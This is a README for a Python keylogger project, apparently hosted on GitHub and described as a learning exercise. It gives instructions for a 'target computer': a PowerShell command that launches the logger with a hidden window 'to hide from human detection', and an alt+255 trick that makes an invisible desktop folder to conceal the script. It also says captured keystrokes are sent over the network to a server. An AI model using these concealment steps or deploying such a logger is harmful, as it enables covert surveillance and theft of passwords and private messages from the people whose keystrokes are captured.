# Keylogger

FOR FUN - ONLY TO BE USED HARMLESSLY AND LOCALLY <br>
I created this as a fun side project to learn more about computer security and networks.<br><br>
Keylogger logic using [this keyboard repository](https://github.com/boppreh/keyboard). Currently works as a keylogger for the local computer. Must "pip install keyboard" for project to work.
Program can be run on Windows and Mac. Should be interoperable with other linux systems but I have yet to test.

## Target computer requirements
- Must have python installed and be able to use from the command prompt or terminal
- must run the command "pip install keyboard" to download the dependency

## How to use
- Open command prompt/terminal
- Change directory to the folder where you have the program
  - for example: "cd filePath"
  - IMPORTANT: changing the directory ensures the keystrokes are written into the text file where the program is
- Run the program from the command prompt/terminal
  - for example: "python main.py"
 
## (Windows) How to run program in background to hide from human detection, use record-keys-on-local-machine directory
- Open a new Notepad file
- Write the following commands:
  - cd "c:\filePath"
  - $process = Start-Process -FilePath "python" -ArgumentList ".\main.py" -WindowStyle Hidden -PassThru
- Save Notepad file as a .ps1 file
- To run, right click file and select "Run with PowerShell"
- Now the program should be running in the background :)

## (Windows) How to make a folder on desktop nameless and invisible
- Create a new folder on desktop
- Rename the folder and enter the keys "alt + 255" for an invisible character
- Choose a blank folder icon
- Folder should now be invisible to the human eye, now put keylogger .ps1 file into this folder to help hide it

## Key features
- In main directory:
  - the program will record keystrokes into a keystrokes.txt file on machine where the client is run.
  - the program will send keystrokes over the network to the server wherever it may be run.
- In record-keys-on-local-machine directory:
  - Upon pressing the "enter" key, a new line and a label notating that the user pressed the "enter" key is written in the text file
  - the program will continue until you press the "escape" key (subject to change)
